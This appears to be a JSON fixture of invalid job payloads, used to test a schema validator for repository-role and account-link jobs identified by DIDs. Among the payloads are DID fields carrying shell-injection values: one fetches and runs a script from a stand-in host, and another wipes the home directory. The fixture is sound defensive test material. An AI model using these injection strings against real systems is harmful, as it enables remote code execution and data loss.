[
  {
    "note": "`kind` is one of the seven forge-neutral kinds.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "deleteRepo",
      "repo": "github.com/acme/widgets"
    }
  },
  {
    "note": "`jobId`, `namespace` and `kind` are always required.",
    "payload": {
      "kind": "archive",
      "repo": "github.com/acme/widgets"
    }
  },
  {
    "note": "Jobs never carry forge credentials.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "archive",
      "repo": "github.com/acme/widgets",
      "token": "ghs_example"
    }
  },
  {
    "note": "A desired role names a git right, not a forge role: mapping rights to roles is the adapter's job.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "projectRoles",
      "repo": "github.com/acme/widgets",
      "desiredRoles": [
        {
          "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
          "account": {
            "forge": "github.com",
            "id": "9120045",
            "login": "bob-builds"
          },
          "right": "admin"
        }
      ]
    }
  },
  {
    "note": "Step names are lowerCamelCase identifiers.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "bootstrap",
      "repo": "github.com/acme/widgets",
      "steps": [
        "required-check"
      ]
    }
  },
  {
    "note": "`removeAccounts`, when present, names at least one account: an empty list would be a job that asks for nothing to be removed while looking as though it did.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "projectRoles",
      "repo": "github.com/acme/widgets",
      "desiredRoles": [],
      "removeAccounts": []
    }
  },
  {
    "note": "`removeAccounts` lists forge accounts, not DIDs: the account to take off the forge often belongs to someone with no DID the VTC knows.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "projectRoles",
      "repo": "github.com/acme/widgets",
      "desiredRoles": [],
      "removeAccounts": [
        "did:webvh:QmDanScid4:dan.example"
      ]
    }
  },
  {
    "note": "`subject` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "beginAccountLink",
      "subject": "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)"
    }
  },
  {
    "note": "`subject` is a DID, and a DID has no whitespace in it.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "beginAccountLink",
      "subject": "did:web:acme-vtc.example:bob evil"
    }
  },
  {
    "note": "`subject` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "beginAccountLink",
      "subject": "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK"
    }
  },
  {
    "note": "`subject` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "beginAccountLink",
      "subject": "did:WebVH:QmBobScid2:acme-vtc.example:bob"
    }
  },
  {
    "note": "`desiredRoles[].subject` is a DID too: the same syntax applies to every DID a job carries.",
    "payload": {
      "jobId": "job_1",
      "namespace": "ns_1",
      "kind": "projectRoles",
      "repo": "github.com/acme/widgets",
      "desiredRoles": [
        {
          "subject": "did:web:acme-vtc.example;rm${IFS}-rf${IFS}~",
          "account": {
            "forge": "github.com",
            "id": "9120045",
            "login": "bob-builds"
          },
          "right": "git.repo.maintain"
        }
      ]
    }
  }
]
